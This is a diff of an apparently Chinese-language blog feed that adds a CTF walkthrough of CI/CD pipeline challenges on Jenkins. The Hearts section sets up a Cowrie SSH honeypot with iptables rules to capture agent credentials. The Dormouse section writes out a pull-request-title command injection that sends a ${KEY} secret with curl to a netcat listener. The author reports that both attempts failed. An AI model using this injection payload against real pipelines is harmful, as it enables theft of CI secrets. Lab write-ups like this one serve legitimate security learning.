@@ -405,6 +405,8 @@ loading="lazy"
 &lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210235542.png"
 loading="lazy"
 >&lt;/p>
+&lt;h3 id="总结-6">总结&lt;/h3>
+&lt;p>通过修改配置文件，影响流水线的执行过程&lt;/p>
 &lt;h2 id="hard---hearts">Hard - Hearts&lt;/h2>
 &lt;h3 id="提示-7">提示&lt;/h3>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">谁偷了那些馅饼？你的目标是拿到flag8的凭证。但别急……这些是存储在Jenkins上的系统凭证！你该如何访问它们呢？拥有管理代理的权限可能会对你有用……
@@ -412,13 +414,82 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">你已经暴力破解了Knave这个Jenkins用户了吗？
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">如果你还没有，Knave用户的密码是rockme。
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jenkins系统凭证可以被代理访问。创建一个代理，使用flag8作为它的SSH凭证，并尝试捕获它。
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="过程-7">过程&lt;/h3>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>关于ssh蜜罐：
+SSH蜜罐是一种安全工具，通常用于捕获、监控和分析针对SSH（Secure Shell）服务的攻击行为。SSH是一种用于远程管理计算机和服务器的协议，攻击者经常尝试通过暴力破解、弱密码或漏洞利用等手段进行入侵。为了应对这些威胁，SSH蜜罐的作用是在攻击者进行非法访问时将其引导到一个受控的环境中，在这个环境中，攻击者的活动可以被监控、记录，甚至反向攻击以识别攻击者的真实身份。&lt;/p>
+&lt;p>主要特点：&lt;br>
+诱骗攻击者：SSH蜜罐通过模拟SSH服务，吸引攻击者的注意力，使其误认为它是一个真实的服务器。&lt;br>
+监控攻击行为：蜜罐可以记录攻击者的所有行为，包括暴力破解密码、尝试不同的用户名、使用恶意脚本等。&lt;br>
+无害环境：通常，蜜罐环境是与生产系统隔离的虚拟环境，攻击者在其中的行为不会对真实系统造成危害。&lt;br>
+数据收集与分析：通过SSH蜜罐，安全团队可以收集攻击者的技术手段、工具、攻击模式等信息，为防御措施提供依据。&lt;br>
+使用场景：&lt;br>
+安全研究：帮助安全研究人员深入了解攻击者的行为，识别新型攻击模式和漏洞。&lt;br>
+入侵检测与防御：在检测到异常的SSH连接时，SSH蜜罐能够提供进一步的线索。&lt;br>
+提高系统安全性：通过分析蜜罐中的日志和数据，增强对网络的监控与防护能力。&lt;br>
+常见的SSH蜜罐工具：&lt;br>
+Cowrie：一个常用的SSH蜜罐工具，它能够模拟SSH登录，记录攻击者的输入，甚至能够模拟命令执行并让攻击者误以为自己已经成功登录。&lt;br>
+Honeyd：一个可以创建多个虚拟主机的蜜罐工具，可以模拟各种服务，包括SSH服务。&lt;/p>
+&lt;h3 id="过程-7">过程&lt;/h3>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo docker run -p 2222:2222 cowrie/cowrie
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>端口被占用了，换一个
 &lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210233101.png"
 loading="lazy"
 >&lt;/p>
-&lt;h3 id="总结-6">总结&lt;/h3></description></item><item><title>训练营-第二阶段</title><link>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</link><pubDate>Mon, 28 Oct 2024 21:17:13 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</guid><description/></item><item><title>Islet_runable</title><link>https://blog.nrevery.cn/p/islet_runable/</link><pubDate>Tue, 10 Sep 2024 10:42:30 +0800</pubDate><guid>https://blog.nrevery.cn/p/islet_runable/</guid><description>&lt;p>配置代理：
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sudo echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward 这个命令我会显示权限不够&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo sysctl -w net.ipv4.ip_forward&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="c1"># 改成这个命令&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo iptables -P FORWARD ACCEPT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo iptables -A INPUT -p tcp --dport &lt;span class="m">2222&lt;/span> -j ACCEPT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo iptables -t nat -A PREROUTING -p tcp --dport &lt;span class="m">22&lt;/span> -j REDIRECT --to-ports &lt;span class="m">2222&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如何知道蜜罐的ip：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo docker ps
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo docker inspect 53babb3846e4 &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;IPAddress&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241211230226.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>根据提示，通过Knave，rockme登录jenkins&lt;/p>
+&lt;p>新建一个节点，配置如下：&lt;/p>
+&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241211231244.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>显示没有java&lt;/p>
+&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241211231157.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>但是看了java应该没有问题？&lt;/p>
+&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241211231546.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>目前卡在了这里&lt;/p>
+&lt;h3 id="总结-7">总结&lt;/h3>
+&lt;p>蜜罐监听，似乎不难但是没成功&lt;/p>
+&lt;h2 id="hard---dormouse">Hard - Dormouse&lt;/h2>
+&lt;h3 id="提示-8">提示&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">“我在睡觉时呼吸”和“我在呼吸时睡觉”是一样的吗？如果你在黑客入侵流水线时窃取秘密，这是否意味着你在窃取秘密时黑客入侵流水线？这些胡说八道先放一边。黑掉 Dormouse 流水线。偷取 flag 9。祝好运。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reportcov.sh 脚本的代码存储在哪里？
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">访问 Cov 组织下的 reportcov 源代码。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">你能向它的工件中添加恶意代码吗？审查 reportcov 的 Jenkinsfile，寻找可能的命令注入漏洞。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">创建一个针对 reportcov 仓库的 pull request，并在标题中注入代码到其流水线中。
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意这个.sh
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241211234613.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>存在注入漏洞
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241211234844.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="过程-8">过程&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nc -nvlp &lt;span class="m">12345&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>fork仓库，随意稍作修改，然后push
+把pr的title改成&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">`echo &amp;#34;${KEY}&amp;#34; &amp;gt; key &amp;amp;&amp;amp; curl -v -F file=@key http://192.168.192.155:12345`
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241212003646.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>理论上应当能监听到，但是agent1似乎被我折腾坏了，导致offline，根本不能执行流水线&lt;/p>
+&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241212004314.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="总结-8">总结&lt;/h3>
+&lt;p>同样是看着似乎不难，但是没成功，之后会再尝试的。&lt;/p></description></item><item><title>训练营-第二阶段</title><link>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</link><pubDate>Mon, 28 Oct 2024 21:17:13 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</guid><description/></item><item><title>Islet_runable</title><link>https://blog.nrevery.cn/p/islet_runable/</link><pubDate>Tue, 10 Sep 2024 10:42:30 +0800</pubDate><guid>https://blog.nrevery.cn/p/islet_runable/</guid><description>&lt;p>配置代理：
 firefox - 设置 - 常规 - 网络设置&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">https_proxy&lt;/span>&lt;span class="o">=&lt;/span>http://10.12.170.200:7890
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">http_proxy&lt;/span>&lt;span class="o">=&lt;/span>http://10.12.170.200:7890
